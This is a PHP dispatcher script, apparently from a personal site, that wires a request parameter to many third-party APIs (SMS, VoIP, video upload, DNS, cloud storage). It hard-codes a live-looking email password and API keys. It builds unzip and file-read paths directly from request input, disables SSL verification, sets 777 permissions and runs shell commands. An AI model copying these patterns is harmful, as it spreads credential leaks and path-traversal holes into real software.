<?php 
// #!/usr/bin/php -q
// 实现的主要功能：
// ---------------------------------------------------------------------------------------------------------------
//  01 ICO 图标图片自动生成，实现本站主ICO生成调用，手动生成ICO。
//  02 飞信公众平台 消息收发应用,实现消息订阅系统。
//  http://gz.feixin.10086.cn
//  03 voxeo 网络电话接口Web应用，实现语音客服的简易语音留言系统。
//  http://evolution.voxeo.com/
//  04 bing 网络搜索接口Web应用，实现网络搜索和划词搜索。
//  https://datamarket.azure.com/
//  05 xmpphp Jabber/Gtalk即时通Web应用，实现发送陌生人离线消息。
//  http://code.google.com/p/xmpphp 0.1rc2-r77
//  06 bambuser 手机和电脑摄像视频播放应用,实现视频播放系统。
//  http://bambuser.com/api/keys
//  07 redhat 网络云主机应用，实现云主机系统配置。
//  08 zip 服务器端文件压缩与解压组件应用，实现文件打包与解包处理。
//  https://openshift.redhat.com/app/console/ions
//  https://access.redhat.com/knowledge/docs/OpenShift/
//  09 dnspod DDNS域名解析管理接口Web应用（可完成指定域名监控）。
//  https://www.dnspod.cn/
//  10 FTP 服务器端组件应用，（可完成任意指定文件FTP上传存储等）。
//  11 live 自定义域名邮箱管理接口Web应用。
//  https://domains.live.com/service/managedomain2.asmx
//  12 live 翻译widget,实现网页翻译插件。
//  http://www.microsofttranslator.com/widget/?ref=MSTWidget
//  13 ctrip 酒店Web应用，实现网页酒店接口系统。
//  http://u.ctrip.com/union/
//  14 efxnow skydrive网盘Web应用，实现网页网盘接口系统。
//  http://msdn.microsoft.com/en-us/live//default.aspx
//  15 chanet web任务应用,实现网页应用插件。
//  http://www.chanet.com.cn
//  16 webxml Webserver服务接口Web应用，实现证券、列车、航班、电视预告服务查询。(?)
//  http://www.webxml.com.cn/zh_cn/index.aspx
//  17 domainshare 免费TK域名Web应用,实现网页免费TK域名接口系统。
//  http://www.nic.tk/en/domainshareapi.html
//  18 爱帮乘车Web应用，实现乘车线路系统。
//  http://www.aibang.com/api/mykeys
//  19 phono 网络电话Web应用,实现网页网络电话接口系统。
//  http://phono.com/
//  20 zhuna 酒店订单Web应用,实现网页酒店订单接口系统。
//  http://open.zhuna.cn/
//  21 addthis 收藏接口Web应用，实现网址收藏接入系统。
//  http://www.addthis.com/
// J22 stickam 影音文字聊天会议室接口调用，实现Flash视频会议系统。
//  http://www.stickam.tv/
//  23 myfxbook版OANDA外汇Web应用，实现OANDA外汇查询系统
//  http://www.myfxbook.com/api
//  24 168reg 网络支付接口Web应用，实现王英等网络支付系统。（*）
//  http://webthumbnail.org/api-reference
//  25 jiankongbao 域名监控接口Web应用，实现域名周期监控。
//  http://www.jiankongbao.com/
//  26 vdisk 网盘接口Web应用，实现网盘系统。
//  http://vdisk.me/
//  27 google 短网址接口Web应用，实现短网址系统。
//  https://developers.google.com/url-shortener/?hl=zh-CN
//  28 免费顶级域名代理API,实现免费顶级域名代理注册系统。
//  http://www.dot.tk
//	http://www.freenom.com/en/resellerapispecs.html
//  29 mediafire 云存储和文件转换接口Web应用，实现个人云存储和文件转换系统。（*）
//  http://developers.mediafire.com
//  30 webthumbnail 缩略图接口Web应用，实现网页缩略图系统。（*）
//  http://webthumbnail.org/api-reference
//  31 parse 综合数据库设计Web应用，实现纯REST数据库设计系统。
//  https://www.parse.com/
//  32 fpdf 多语言PDF文档Web应用，实现网页PDF文档生成接口系统。（*）
//  https://www.fpdf.org/
//  33 webcams 旅游观光镜头Web应用,实现网页镜头接口系统。
//  http://cn.webcams.travel/developers/
//  34 freemusicarchive 音乐搜索Web应用,实现网页音乐搜索下载接口系统。
//  http://freemusicarchive.org/api
//  35 wiqet 视频图片和摄像头Web应用,实现网页视频图片和摄像头接口系统。
//  http://kb.wiqet.com/kb/entry/7/


// ---------------------------------------------------------------------------------------------------------------
// 地址：http://x3193.tk/
// ---------------------------------------------------------------------------------------------------------------

// 集中设置区域
$ipstr='';
$IPFilter = new IPFilter($ipstr);
$redirecturl = syssetini().'&serverip='.trim($_SERVER['SERVER_NAME'])."&verify=";
//echo trim(request('api')).trim(request('action')).$redirecturl;
//return;
$botapienable = '1';
$smartverify = '1';
$ipverify = '11';

// 集中设置区域

// --------------------------------

if(!isset($_SERVER['REMOTE_ADDR'])){
        // #!/usr/bin/php -q
        cpanel();
        return true;
}
elseif(strtolower(trim(request('api'))) == 'fetion'){

}
elseif(strtolower(trim(request('api'))) == 'imified' && strtolower(trim(request('action'))) == 'bot'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != 'vfcgalbdraewvbgrb67y32y4r3qg93h9'){
                        redirect($redirecturl);
                        return;
                }       
        }
}
elseif(strtolower(trim(request('api'))) == 'htaccess'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != ''){
                        redirect($redirecturl);
                        return;
                }       
        }	
}
elseif(strtolower(trim(request('api'))) == 'tropo'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != ''){
                        redirect($redirecturl);
                        return;
                }       
        }	
}
elseif(strtolower(trim(request('api'))) == 'setup'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != ''){
                        redirect($redirecturl);
                        return;
                }       
        }
}
elseif(strtolower(trim(request('api'))) == 'voxeo'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != 'vnjk4673fvhn578ghr48hrgfv4h90585'){
                        redirect($redirecturl); 
                        return;         
                }       
        }       
}
elseif(strtolower(trim(request('api'))) == 'webxml' && strtolower(trim(request('bot'))) == '1'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != 'f6tv73fbednxwmqp,btnvurceiowvn4f'){
                        redirect($redirecturl); 
                        return;         
                }       
        }       
}
elseif(strtolower(trim(request('api'))) == 'lcid'){
}
elseif(strtolower(trim(request('api'))) == 'vpn' && strtolower(trim(request('action'))) == 'code' ){
}
elseif(strtolower(trim(request('api'))) == 'blank'){
}
elseif(strtolower(trim(request('api'))) == 'baidu'){
}
elseif(strtolower(trim(request('api'))) == 'verify'){
	verify();
	exit;
}
else{
		
	//echo $redirecturl;
	//return;

	$IPFilter = new IPFilter('');
  $ipallow = $IPFilter->IPlimiter();

        //print_r($IPFilter->IPlimiter());

	
	if (arrmember(checkip($ipallow,$redirecturl),'0') == '0' && $ipverify === '1'){
		redirect(arrmember(checkip($ipallow,$redirecturl),'1')); 
		//echo '1';
	}
	else{
		
if(''==''){
	
	session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
	if(isset($_COOKIE[session_name()])) { 
  	session_id($_COOKIE[session_name()]); 
	} 
	setcookie(session_name(),session_id(),time()+3600 * 24 * 30 * 12 * 20);
	session_start();
	if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
	}
	elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
	}
	//echo $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' j '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
	
if(($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] == $_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']!='')){

			if(file_exists('./verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){

			}else{
	       	touch ('./verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);        			
			}
			
}
else{
	if(file_exists('./verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){

			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = $_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];	
	    session_write_close();			
			session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
			if(isset($_COOKIE[session_name()])) { 
  			session_id($_COOKIE[session_name()]); 
			} 
			setcookie(session_name(),session_id(),time()+3600 * 24 * 30 * 12 * 20);
			session_start();
			if(substr(PHP_VERSION, 0, 3)=='5.4'){
				//session_register("X3193");
			}
			elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
				session_register("X3193");
			}	
					
	}
	elseif(file_exists('./verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){

			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'], time() + 3600*24*31);

	}
	else{
		
			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][url]", trim($_SERVER["SCRIPT_NAME"])."?".$_SERVER['QUERY_STRING'], time() + 3600*24*31*12*20);
			session_destroy();
			if(!is_dir('./verifylist/')){
						mkdir('./verifylist/',0777);
			}			
			if(function_exists('passthru')){
						passthru("find /var/lib/openshift/5419a3585004461665000be4/app-root/runtime/repo/verifylist/* -type f -mtime +90 -delete",$result);			
			}else{
						deldir('./verifylist/','90','');
			}		
			echo "<script>window.location = \""."./diy.php?api=verify&verify="."\" ;</script>";
			exit;	
			
	}
}
} 
	}
}

switch (strtolower(trim(request('api')))) {
    case "htaccess":
        htaccess();
	exit;
    case "icon":
        icon();
	exit;
    case "vpn":
        vpn();
	exit;
    case "mobile":
        mobile();
	exit;
    case "msn":
        msn();
	exit;
    case "openshift":
        openshift();
	exit;
    case "meitu":
        meitu();
	exit;	
    case "picture":
        picture();
	exit;
    case "vdisk":
        vdisk();
	exit;	
    case "imified":
        imified();
	exit;
    case "media":
        wiqet();
	exit;
    case "cpanel":
        cpanel();
	exit;
    case "filenamager":
        filenamager();
	exit;
    case "voxeo":
        voxeo();
	exit;
    case "tropo":
        tropo();
	exit;
    case "discuz":
header('Content-Type: text/html; charset=utf-8');

define('CURSCRIPT', 'archy');//body的一个class标识
require './source/class/class_core.php';//引入系统核心文件
$discuz = & discuz_core::instance();//以下代码为创建及初始化对象
$discuz->init();
loadcache('diytemplatename');//DIY要载入缓存 
//echo getcharset();    
			
switch (trim(request('action'))) {
        case "ths":
$navtitle = iconv('gb2312','utf-8','FLASH股市行情');
$metakeywords = iconv('gb2312','utf-8','FLASH,股市行情');
$metadescription = iconv('gb2312','utf-8','FLASH股市行情');
               	break;
        case "zhibo":
$navtitle = iconv('gb2312','utf-8','国际网络直播');
$metakeywords = iconv('gb2312','utf-8','国际,直播');
$metadescription = iconv('gb2312','utf-8','国际网络直播');
               	break;
        case "meitu":

$navtitle = iconv('gbk','utf-8','美图图片美化');
$metakeywords = iconv('gb2312','utf-8','美图,图片美化');
$metadescription = iconv('gb2312','utf-8','美图图片美化');
               	break;               	
        default:
        
               	break;
}               	
include template('diy:forum/diy_header');//调用单页模版文件
        discuz();
include template('diy:forum/diy_footer');//调用单页模版文件    

	exit;	
    case "stock":
        stock_10jqka();
	exit;
    case "jiankongbao":
        jiankongbao();
	exit;
    case "fpdf":
        fpdf();
	exit;
    case "pdf":
        fpdf();
	exit;
    case "byban":
        byban();
	exit;
    case "webxml":
        webxml();
	exit;
    case "bing":
        bing();
	exit;
    case "tel":
        tel();
	exit;
    case "idoll":
        idoll();
	exit;
    case "smtp":
        smtp();
	exit;
    case "blank":
        blank();
	exit;
    case "phpinfo":
        phpsysinfo();
	exit;
    case "gmap":
        gmap();
	exit;
    case "unzip":
        $archive_type = "zip";
        if ($archive_type == "zip") {
                $zip = new PclZip("./".trim(request("zip")));
                chmod("./unzip", 777);          
                $list = $zip->extract($p_path = "./unzip");
        }
        elseif ($archive_type == "tar" || $archive_type == "tgz" || $archive_type == "gz") { 
                chmod("./unzip", 777);
                $list = PclTarExtract("./".trim(request("zip")), "./unzip/");
        }
        print_r($list);
	exit;
    case "zip":
        $zip = new zipfile();
        $handle = fopen("./unzip/".trim(request("file")), "x+");
        $string = fread($handle, filesize("./unzip/".trim(request("file"))));
        fclose($handle);        
        $zip->addFile($string, "unzip/".trim(request("file")));
        $string = $zip->file();
        chmod("./unzip", 777);  
        $handle = fopen("./unzip/".trim(request("file")).".".time().".zip", "wb");
        fwrite($handle, $string);
        fclose($handle);        
	exit;
    case "player":
        player();
	exit;
    case "ispeech":
        ispeech();
	exit;
    case "gtalk":
        gtalk();
	exit;
    case "xmpp":
        xmpphp();
	exit;
    case "dnspod":
        dnspod();
	exit;
    case "zoho":
        zoho();
	exit;
    case "pathparse":
        print_r(parse_url("sfhsfjkl.jpg"));
	exit;
    case "imageconvert":
        new ImageConverter('x3193.gif','png',1);
	exit;
    case "test":
    echo getheadcharset();
    exit;
system("cp -f /etc/php.d/sqlite3.ini /var/lib/openshift/93f3858302ee4d3da0a8fd15d6f6af22/app-root/runtime/repo/php/",$uyyyy);
echo $uyyyy;
    					if (function_exists('dl'))
    						echo 'tgggg';
    					echo '11111';
    					exit;
    					$mediafire = new mediafire_class();
    					$mediafire->mediafirefileconvert();
    					exit;
                 													$vdisk = new vdisk_class();
																					if($vdisk->vdiskxupload("xcy6272003@126.com", "EUIfgwe7","./tmp/vdisk/bmfmt4setup.exe","0")){ 
																								echo 'okccc'.time();
																					}
    
    	exit;
                   			//$_SESSION['X3193']['global']['']['verify']['success'] = randcode(32,'');
              		 			setcookie("X3193[global][tt][verify][success]", $_SESSION["X3193"]['global']['']['verify']['success']);
              		 			echo trim($_SERVER['REMOTE_ADDR']);

			exit;	

    		if(!file_exists('./ddddd')){
					echo file_exists('./ddddd');
					mkdir("./ddddd", 0777, true);
					echo file_exists('./ddddd');
				}	

    		exit;
    		
				if(trim(request('post'))==''){
				?>
<html>
<body>
<Form action="?api=test&post=1" enctype="multipart/form-data" method="post" id='tudou'>
    <input type="file" name="file" id="upFile">
    <input type="submit" value="Submit" />
</Form>

				<?php 
				exit;
				}
                        	$url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8','你好'))."&tags=".encodeuri(iconv('gb2312','utf-8','你好').','.iconv('gb2312','utf-8','X3193'))."&channelId=10&title=".encodeuri(iconv('gb2312','utf-8','你好')); 
                                echo $url;
                                $postdata = '';
                                $header[] = "Content-type: application/json; charset=utf-8";
                                $header[] = "Content-length: ".strlen($postdata);
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                curl_setopt($ch, CURLOPT_USERPWD, 'xcy6272003@126.com'.':'.'EUIfgwe7');
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                $jsonstr = curl_exec($ch);
                                $jsoncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                curl_close($ch);
                                //echo $jsonstr;
                                $jsonarray = json_decode($jsonstr,true);

                       		//$filename = time().'.'.geturlinfo(httppathdir()."/tmp/".basename($_FILES['file']['name']),"ext");

                       		copy($_FILES['file']['tmp_name'], "./tmp/".basename($_FILES['file']['name']));
                       		//echo realpath("tmp/".$filename);
               			$ch = curl_init();
               			curl_setopt($ch, CURLOPT_URL, trim(httppathdir()."/tmp/".basename($_FILES['file']['name'])));
               			curl_setopt($ch, CURLOPT_HEADER, 0);
               			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
               			curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
               			curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
               			$xmlstr = curl_exec($ch);
                       		//echo $xmlstr;               			
               			curl_close($ch);
               			$postdata = array(
					"file"  => "@"."tmp/".basename($_FILES['file']['name'])
				);
               			
                       		$url = $jsonarray['itemUploadInfo']['uploadUrl']; 
                       		echo $url;               
                       		$header[] = "Content-type: application/x-www-form-urlencoded";
                       		$header[] = "Content-length: ".strlen($postdata);
                       		//$header[] = $postdata;
                       		$ch = curl_init();
                       		curl_setopt($ch, CURLOPT_URL, $url);
                       		curl_setopt($ch, CURLOPT_HEADER, 0);
                       		//curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                       		//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                       		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                       		curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                       		curl_setopt($ch, CURLOPT_POST, 1);
                       		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                       		$xmlstr = curl_exec($ch);
                       		echo $xmlstr;
                       		curl_close($ch);

			        //echo $xmlstr;
        			$pathinfo = parse_url(trim(httppathdir()."/tmp/".basename($_FILES['file']['name'])));
        			if($pathinfo['host'] == $_SERVER['SERVER_NAME'])
                			unlink('./tmp/'.geturlinfo(trim(httppathdir()."/tmp/".basename($_FILES['file']['name'])),"filename"));
			
        			$objXml = new DOMDocument();  
        			$objXml->preserveWhiteSpace = true;
        			$objXml->async = false; 
        			//echo $xmlstr;
   				return;
                                
                                $url = "http://api.tudou.com/v3/gw?method=item.upload";               
                                echo $url;
                                $url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8','你好'))."&tags=".encodeuri(iconv('gb2312','utf-8','你好').','.iconv('gb2312','utf-8','X3193'))."&channelId=10&title=".encodeuri(iconv('gb2312','utf-8','你好'));               
                                $header[] = "Content-type: application/json; charset=utf-8";
                                $header[] = "Content-length: ".strlen($postdata);
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                curl_setopt($ch, CURLOPT_USERPWD, 'xcy6272003@126.com'.':'.'EUIfgwe7');
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                $jsonstr = curl_exec($ch);
                                $jsoncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                curl_close($ch);
                                echo $jsonstr;
                                $jsonarray = json_decode($jsonstr);
                                ?>
<html>
<body>
<Form action="<?php echo $jsonarray['itemUploadInfo']['uploadUrl'];?>" enctype="multipart/form-data" method="post" id='tudou'>
    <input type="file" name="file" id="upFile">
    <input type="submit" value="Submit" />
</Form>
</body>
</html>
                                
                                <?php 
                                return;

    				echo rand(0,1);
				?>
				<script language="JavaScript" type="text/javascript">
					var count = 0;
					function talk(){
						if (count == '0'){
							count = 1;
	        					document.getElementById('talk').innerHTML = '<embed  style="margin-bottom: -3px;" src="?api=ispeech&action=binary&tts=<?php echo encodeuri(iconv('gb2312','utf-8',trim(request('tts'))))?>" autostart="true" loop="true" hidden="true" width="0" height="0"><a href="javascript:talk();">返回</a></embed>';
						}	
						else{
							count = 0;
	        					document.getElementById('talk').innerHTML = '<a href="javascript:talk();">说话</a>';
						}	
        				}
				</script>
				<span id='talk' width='0' height='0'><a href='javascript:talk();'>说话</a></span>
				
				<object style="margin-bottom: -3px;" type="application/x-shockwave-flash" data="http://www.ispeech.org//dewplayer-mini.swf" width="165" height="20" id="dewplayer" name="dewplayer">
              			<param name="wmode" value="transparent" />
             			<param name="movie" value="http://www.ispeech.org//dewplayer-mini.swf"/>
              			<Param name="flashvars" value="mp3=http://api.ispeech.org/api/rest?apikey=<?php  echo encodeuri("b40d4be174135612e9eff368efe3bf64&format=mp3&action=convert&text=".encodeuri(iconv('gb2312','utf-8',trim(request('tts'))))."&voice=chchinesemale");?>">
              			<param name="wmode" value="transparent" />
              			<param name="AutoStart" value="1" />
              			</object>

				<?php 
    				echo encodeuri(iconv('gb2312','utf-8','你好'));
    				return;
				print_r(json_decode('{"error": {"errors": [{"domain": "global","reason": "required","message": "Required","locationType": "parameter","location": "resource.longUrl"}],"code": 400,"message": "Required"}}', true));
				return;

 			        //setcookie ("X3193[global][verify][success]", "ddddd", time() + 3600*24*31, "/", ".".$_SERVER['SERVER_NAME'], 1);
 				//echo $_COOKIE['X3193']['global'][arrmember(checkip($ipowner,$redirecturl),'1')]['verify']['success'];
 				//return;
 				
 				//print_r(json_decode('{"error": {"errors": [{"domain": "global","reason": "required","message": "Required","locationType": "parameter","location": "resource.longUrl"}],"code": 400,"message": "Required"}}',true));
 				
                                $user = trim(request('user'))?trim(request('user')):'8615998963077';
                                $msg = iconv('gb2312','utf-8',trim(request('msg')))?iconv('gb2312','utf-8',trim(request('msg'))):iconv('gb2312','utf-8',Pinyin(trim('域名删除失败！原因：“未选择任何条目！”bccaqc'),getcharset(),true,"cn"));
                                $url = "http://api.messaging.staging.voxeo.net/1.0/messaging?botkey=94491&apimethod=send&user=".trim($user)."&network=sms&from=12026008419&msg=".encodeuri($msg);               
                                echo $url;
                                $postdata = '';
                                $header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
                                $header[] = "Content-length: ".strlen($postdata);
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                curl_setopt($ch, CURLOPT_USERPWD, 'x3193'.':'.'EUIfgwe7');
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                $xmlstr = curl_exec($ch);
                                $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                curl_close($ch);
                                echo $xmlstr;
                                return;


session_start();//开启session; 
$authnum_session = ''; 
$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
//定义用来显示在图片上的数字和字母; 
$l = strlen($str); //得到字串的长度; 
//循环随机抽取四位前面定义的字母和数字; 
$numcount = trim(request("count"))==""?"4":trim(request("count"));
for($i=1;$i<=$numcount;$i++) 
{ 
$num=rand(0,$l-1); 
//每次随机抽取一位数字;从第一个字到该字串最大长度, 
//减1是因为截取字符是从0开始起算;这样34字符任意都有可能排在其中; 
$authnum_session.= $str[$num]; 
//将通过数字得来的字符连起来一共是四位; 
} 
        echo $authnum_session;
        return;
        
        session_start();
        $data=array('mail' => array('uname' => 'x3193', 'pwd' => 'EUIfgwe7'),'uname'=>'x3193');
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
        session_register("data");
}        

        $_SESSION["data"]=$data;
        echo $_SESSION["data"]['uname'];
        session_unset("data");
        session_unregister("data");
        return;


        $url = "https://api.smsified.com/v1/messages/";
        //$postdata = "address=tel%3A%2B14122138942&message=Hi".iconv('utf-8','gb2312','我');
        //$header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
        //$header[] = "Content-length: ".strlen($postdata);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERPWD, 'x3193'.':'.'EUIfgwe7');
        //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
        //curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                        
        //curl_setopt($ch, CURLOPT_POST, 1);
        //curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
        $xmlstr = curl_exec($ch);
        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
        curl_close($ch);
        echo $xmlstr.$xmlcode;
        if (trim(request('get')) == "")
                return;
                                
        $url = "https://api.smsified.com/v1/smsmessaging/outbound/tel%3A%2B14123466287/requests";
        $postdata = "address=tel%3A%2B14122138942&message=Hi".iconv('utf-8','gb2312','我');
        $header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
        $header[] = "Content-length: ".strlen($postdata);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERPWD, 'x3193'.':'.'EUIfgwe7');
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
        $xmlstr = curl_exec($ch);
        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
        curl_close($ch);
        echo $xmlstr.$xmlcode;

        $str = 'IM-d-T';
        if (strpos($str, 'IM') == '0' && (preg_replace("/IM[-][ ]*([^ ]+)[ ]*[-][ ]*([^ ]+)[ ]*/", "IM-\$1-\$2", $str) == $str)){
                echo 'yyyyy';
        }
        else{
                echo 'exit';
        }

        date_default_timezone_set('UTC'); 
        list($msec, $sec) = explode(" ", microtime()); 
        echo date("YmdHis",$sec+3600*8); 
        echo "gd:when startTime='".date("Y",$sec+3600*8)."-".date("m",$sec+3600*8)."-".date("d",$sec+3600*8)."T".date("h",$sec+3600*8).":".date("i",$sec+3600*8).":".date("s",$sec+3600*8).".000Z' endTime='".date("Y",$sec+3600*8)."-".date("m",$sec+3600*8)."-".date("d",$sec+3600*8)."T".date("h",$sec+3600*(8+1)).":".date("i",$sec+3600*8).":".date("s",$sec+3600*8).".000Z'";
        return;
        $str = '提醒：活动详情 @ 2010-09-21 (周二) 下午7:52 - 下午8:52 (robot@xiayu.x3193.cz.cc)';
        echo substr($str,strpos($str,'：')+2,strripos(substr($str,strpos($str,'：')+1,strpos($str,'@')-1),'@')-2);
        echo "\r\n";

        date_default_timezone_set('UTC'); 
        list($msec, $sec) = explode(" ", microtime()); 
        echo date("YmdHis",$sec+3600*8).rand(1,1000).".ico"; 
        echo "\r\n";

        $mime = 'Subject: =?UTF-8?B?UHLDvGZ1bmcgUHLDvGZ1bmc=?=
To: example@example.com
Date: Thu, 1 Jan 1970 00:00:00 +0000
Message-Id: <example@example.com>
Received: from localhost (localhost [127.0.0.1]) by localhost
    with SMTP id example for <example@example.com>
    Thu, 1 Jan 1970 00:00:00 +0000 (UTC)
    (envelope-from example-return-0000-example=example.com@example.com)
Received: (qmail 0 invoked by uid 65534); 1 Thu 2003 00:00:00 +0000';
                        $headers =  iconv_mime_decode_headers(GetGB2312String($mime), 0, "gbk");
                        print_r($headers);

        echo strripos("x3193.x3193.pp.ru","x3193.pp.ru")." ".(strlen("x3193.x3193.pp.ru")-strlen("x3193.pp.ru"))." ";
        echo "\r\n";

        echo $_SERVER['REMOTE_HOST'];
        echo "\r\n";
        
        $ch = curl_init();
        $url = httppathdir()."?api=lcid";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        $xmlstr = curl_exec($ch);
        echo curl_getinfo($ch,CURLINFO_HTTP_CODE);
        echo "\r\n";
        curl_close($ch);        

        echo $_SERVER["PHP_SELF"];
        echo "\r\n";
        echo substr(sprintf('%o', fileperms('./record')), -4)."\r\n";
        echo "\r\n";
        echo substr(sprintf('%o', fileperms('./index.php')), -4)."\r\n";
        echo "\r\n";
        echo preg_replace("/{[^{}]+}(.*)/", "\$1", "{imap.126.com:143}INBOX");
        echo "\r\n"; 
         
        echo substr(sprintf('%o', fileperms('/')), -4);   
        echo "\r\n";
        echo str_replace("。",".......","我“我！我。我，我！我：我；我？我：");       

	exit;
    case "360safe":
        safe360();
	exit;
    case "ftp":
        ftp();
	exit;
    case "ivr":
        IVR();
	exit;
    case "blogger":
        google();
	exit;
    case "calendar":
        google();
	exit;
    case "urlshortener":
        google();
	exit;
    case "google":
        google();
	exit;
    case "checkcode":
        checkcode();
	exit;
    case "ieshow":
        ieshow();
	exit;
    case "live":
        live();
	exit;
    case "thumb":
        webthumbnail();
	exit;
    case "fetion":
        fetion();
	exit;	
	    case "fileupdate":
        fileupdate();
	exit;	
	    case "randwork":
        randwork();
	exit;	
    case "stickam":
        stickam();
    case "vchat":
        stickam();
	exit;
    case "lcid":
        LCIDS();
	exit;
    case "picasa":
        google();
	exit;
    case "vtele":
        zqredstar();
	exit;
    case "webtv":
        zqredstar();
	exit;
    case "calendar":
        google();
	exit;
    case "docin":
        docin();
	exit;
    case "editor":
        editor();
	exit;
    case "tts":	
				itri();
	exit;				
    case "imap":
        imap();
	exit;
    case "setup":
        setup();
	exit;
    case "pinyin":
